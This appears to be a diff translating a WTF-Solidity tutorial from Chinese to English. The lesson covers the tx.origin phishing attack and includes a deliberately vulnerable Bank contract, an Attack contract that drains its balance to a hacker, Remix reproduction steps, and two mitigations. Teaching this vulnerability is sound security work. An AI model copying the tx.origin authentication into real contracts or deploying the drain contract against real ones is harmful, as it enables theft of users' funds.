@@ -20,99 +20,99 @@ English translations by: [@to_22X](https://twitter.com/to_22X)
 
 -----
 
-这一讲，我们将介绍智能合约的`tx.origin`钓鱼攻击和预防方法。
+In this lesson, we will discuss the `tx.origin` phishing attack and prevention methods in smart contracts.
 
-## `tx.origin`钓鱼攻击
+## `tx.origin` Phishing Attack
 
-笔者上初中的时候特别喜欢玩游戏，但是项目方为了防止未成年人沉迷，规定只有身份证号显示已满十八岁的玩家才不受防沉迷限制。这该怎么办呢？后来笔者使用家长的身份证号进行年龄验证，并成功绕过了防沉迷系统。这个案例与`tx.origin`钓鱼攻击有着异曲同工之妙。
+When I was in middle school, I loved playing games. However, the game developers implemented an anti-addiction system that only allowed players who were over 18 years old, as verified by their ID card number, to play without restrictions. So, what did I do? I used my parent's ID card number to bypass the system and successfully circumvented the anti-addiction measures. This example is similar to the `tx.origin` phishing attack.
 
-在`solidity`中，使用`tx.origin`可以获得启动交易的原始地址，它与`msg.sender`十分相似，下面我们用一个例子来区分它们之间不同的地方。
+In Solidity, `tx.origin` is used to obtain the original address that initiated the transaction. It is similar to `msg.sender`. Let's differentiate between them with an example.
 
-如果用户A调用了B合约，再通过B合约调用了C合约，那么在C合约看来，`msg.sender`就是B合约，而`tx.origin`就是用户A。如果你不了解`call`的机制，可以阅读[WTF Solidity极简教程第22讲：Call](https://github.com/AmazingAng/WTF-Solidity/blob/main/22_Call/readme.md)。
+If User A calls Contract B, and then Contract B calls Contract C, from the perspective of Contract C, `msg.sender` is Contract B, and `tx.origin` is User A. If you are not familiar with the `call` mechanism, you can read [WTF Solidity 22: Call](https://github.com/AmazingAng/WTF-Solidity/blob/main/22_Call/readme.md).
 
 ![](./img/S12_1.jpg)
 
-因此如果一个银行合约使用了`tx.origin`做身份认证，那么黑客就有可能先部署一个攻击合约，然后再诱导银行合约的拥有者调用，即使`msg.sender`是攻击合约地址，但`tx.origin`是银行合约拥有者地址，那么转账就有可能成功。
+Therefore, if a bank contract uses `tx.origin` for identity authentication, a hacker can deploy an attack contract and then induce the owner of the bank contract to call it. Even if `msg.sender` is the address of the attack contract, `tx.origin` will be the address of the bank contract owner, allowing the transfer to succeed.
 
-## 漏洞合约例子
+## Vulnerable Contract Example
 
-### 银行合约
+### Bank Contract
 
-我们先看银行合约，它非常简单，包含一个`owner`状态变量用于记录合约的拥有者，包含一个构造函数和一个`public`函数：
+Let's take a look at the bank contract. It is very simple and includes an `owner` state variable to record the contract owner. It has a constructor and a `public` function:
 
-- 构造函数: 在创建合约时给`owner`变量赋值.
-- `transfer()`: 该函数会获得两个参数`_to`和`_amount`，先检查`tx.origin == owner`，无误后再给`_to`转账`_amount`数量的ETH。**注意：这个函数有被钓鱼攻击的风险！**
+- Constructor: Assigns a value to the `owner` variable when the contract is created.
+- `transfer()`: This function takes two parameters, `_to` and `_amount`. It first checks `tx.origin == owner` and then transfers `_amount` ETH to `_to`. **Note: This function is vulnerable to phishing attacks!**
 
 ```solidity
 contract Bank {
-    address public owner;//记录合约的拥有者
+    address public owner; // Records the owner of the contract
 
-    //在创建合约时给 owner 变量赋值
+    // Assigns the value to the owner variable when the contract is created
     constructor() payable {
         owner = msg.sender;
     }
 
     function transfer(address payable _to, uint _amount) public {
-        //检查消息来源 ！！！ 可能owner会被诱导调用该函数，有钓鱼风险！
+        // Check the message origin !!! There may be phishing risks if the owner is induced to call this function!
         require(tx.origin == owner, "Not owner");
-        //转账ETH
+        // Transfer ETH
         (bool sent, ) = _to.call{value: _amount}("");
         require(sent, "Failed to send Ether");
     }
 }
 ```
 
-### 攻击合约
+### Attack Contract
 
-然后是攻击合约，它的攻击逻辑非常简单，就是构造出一个`attack()`函数进行钓鱼，将银行合约拥有者的余额转账给黑客。它有`2`个状态变量`hacker`和`bank`，分别用来记录黑客地址和要攻击的银行合约地址。
+Next is the attack contract, which has a simple attack logic. It constructs an `attack()` function to perform phishing and transfer the balance of the bank contract owner to the hacker. It has two state variables, `hacker` and `bank`, to record the hacker's address and the address of the bank contract to be attacked.
 
-它包含`2`个函数：
+It includes `2` functions:
 
-- 构造函数:初始化`bank`合约地址.
-- `attack()`：攻击函数，该函数需要银行合约的`owner`地址调用，`owner`调用攻击合约，攻击合约再调用银行合约的`transfer()`函数，确认`tx.origin == owner`后，将银行合约内的余额全部转移到黑客地址中。
+- Constructor: Initializes the `bank` contract address.
+- `attack()`: The attack function that requires the `owner` address of the bank contract to call. When the `owner` calls the attack contract, the attack contract calls the `transfer()` function of the bank contract. After confirming `tx.origin == owner`, it transfers the entire balance from the bank contract to the hacker's address.
 
 ```solidity
 contract Attack {
-    // 受益者地址
+    // Beneficiary address
     address payable public hacker;
-    // Bank合约地址
+    // Bank contract address
     Bank bank;
 
     constructor(Bank _bank) {
-        //强制将address类型的_bank转换为Bank类型
+        // Forces the conversion of the address type _bank to the Bank type
         bank = Bank(_bank);
-        //将受益者地址赋值为部署者地址
+        // Assigns the beneficiary address to the deployer's address
         hacker = payable(msg.sender);
     }
 
     function attack() public {
-        //诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中
+        // Induces the owner of the Bank contract to call, transferring all the balance to the hacker's address
         bank.transfer(hacker, address(bank).balance);
     }
 }
 ```
 
-## `Remix` 复现
+## Reproduce on `Remix`
 
-**1.** 先将`value`设置为10ETH，再部署 `Bank` 合约，拥有者地址 `owner` 被初始化为部署合约地址。
+**1.** Set the `value` to 10ETH, then deploy the `Bank` contract, and the owner address `owner` is initialized as the deployed contract address.
 
 ![](./img/S12-2.jpg)
 
-**2.** 切换到另一个钱包作为黑客钱包，填入要攻击的银行合约地址，再部署 `Attack` 合约，黑客地址 `hacker` 被初始化为部署合约地址。
+**2.** Switch to another wallet as the hacker wallet, fill in the address of the bank contract to be attacked, and then deploy the `Attack` contract. The hacker address `hacker` is initialized as the deployed contract address.
 
 ![](./img/S12-3.jpg)
 
-**3.** 切换回`owner`地址，此时我们被诱导调用了`Attack`合约的`attack()`函数，可以看到`Bank`合约余额被掏空了，同时黑客地址多了10ETH.
+**3.** Switch back to the `owner` address. At this point, we were induced to call the `attack()` function of the `Attack` contract. As a result, the balance of the `Bank` contract is emptied, and the hacker's address gains 10ETH.
 
 ![](./img/S12-4.jpg)
 
-## 预防办法
+## Prevention Methods
 
-目前主要有两种办法来预防可能的`tx.origin`钓鱼攻击。
+Currently, there are two main methods to prevent potential `tx.origin` phishing attacks.
 
-### 1.使用`msg.sender`代替`tx.origin`
+### 1. Use `msg.sender` instead of `tx.origin`
 
-`msg.sender`能够获取直接调用当前合约的调用发送者地址，通过对`msg.sender`的检验，就可以避免整个调用过程中混入外部攻击合约对当前合约的调用
+`msg.sender` can obtain the address of the direct caller of the current contract. By verifying `msg.sender`, the entire calling process can be protected from external attack contracts.
 
 ```solidity
 function transfer(address payable _to, uint256 _amount) public {
@@ -123,9 +123,9 @@ function transfer(address payable _to, uint256 _amount) public {
 }
 ```
 
-### 2.检验`tx.origin == msg.sender`
+### 2. Verify `tx.origin == msg.sender`
 
-如果一定要使用`tx.origin`，那么可以再检验`tx.origin`是否等于`msg.sender`，这样也可以避免整个调用过程中混入外部攻击合约对当前合约的调用。但是副作用是其他合约将不能调用这个函数。
+If you must use `tx.origin`, you can also verify that `tx.origin` is equal to `msg.sender`. This can prevent external contract calls from interfering with the current contract. However, the downside is that other contracts will not be able to call this function.
 
 ```solidity
     function transfer(address payable _to, uint _amount) public {
@@ -136,6 +136,6 @@ function transfer(address payable _to, uint256 _amount) public {
     }
 ```
 
-## 总结
+## Summary
 
-这一讲，我们介绍了智能合约中的`tx.origin`钓鱼攻击，目前有两种方法可以预防它：一种是使用`msg.sender`代替`tx.origin`；另一种是同时检验`tx.origin == msg.sender`。推荐使用第一种方法预防，因为后者会拒绝所有来自其他合约的调用。
+In this lesson, we discussed the `tx.origin` phishing attack in smart contracts. There are two methods to prevent it: using `msg.sender` instead of `tx.origin`, or checking `tx.origin == msg.sender`. It is recommended to use the first method, as the latter will reject all calls from other contracts.
